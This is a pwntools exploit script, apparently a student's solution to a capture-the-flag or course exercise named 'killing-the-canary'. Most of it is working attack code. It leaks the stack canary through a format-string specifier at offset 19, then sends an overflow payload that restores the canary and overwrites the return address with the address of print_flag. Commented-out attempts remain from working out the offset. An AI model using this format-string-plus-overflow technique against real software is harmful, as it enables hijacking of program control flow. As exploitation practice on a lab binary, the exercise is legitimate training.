#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)


# try multiple offsets to locate the canary
# for i in range(1, 30):
#     p = process('./killing-the-canary')
#     payload = f"%{i}$lx"
#     p.recvuntil(b"What's your name? ")
#     p.sendline(payload.encode())
#     result = p.recvline().strip().decode()

#     print(f"Offset {i}: {result}")
#     continue

#     # p.close()

# canary is at offset 19


r.recvuntil(b"What's your name? ")
# r.sendline(b"%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx") #Add your code here
r.sendline(b'%19$lx')

# position_of_canary = 19

# response = r.recvuntil(b"! Let's play a game.\n").decode()
# canary_hex = re.findall(b"([0-9a-f]+)", response)[position_of_canary]  # Replace with index
# canary = int(canary_hex, 16)  # Convert hex string to integer
# log.info(f"Canary: {canary:x}")

response = r.recvuntil(b"! Let's play a game.\n").decode()
# log.info(response)
canary_hex = re.search(r"Hello, ([0-9a-fA-F]+)", response)
if canary_hex:
    canary = int(canary_hex.group(1), 16)
    log.info(f"Canary: {canary:x}")
else:
    log.error("Failed to extract canary.")
    exit(1)


# val = r.recvuntil(b"What's your message? ")
# log.info(val)
# log.info(re.match(b"Hello, ([0-9]+)\n!.*", val))
# canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
# log.info(f"Canary: {canary:x}")


# val = r.recvuntil(b"! Let's play a game.")
# log.info(val)
# val_str = str(val)
# index_of_end = val_str.find("\n")
# log.info(type(val))
# log.info(index_of_end)
# log.info(val[7:index_of_end])
# canary = int(val, 16)
# log.info(canary)


win = exe.symbols['print_flag']
# log.info(hex(win))

# payload = # Add your payload here
# payload = b"A" * 20
payload = (64+8)*b"X"
payload += p64(canary)
payload += b"B" * 8
payload += p64(win)
# log.info(payload)

r.recvuntil(b"What's your message? ")
r.sendline(payload)

r.recvline()
r.interactive()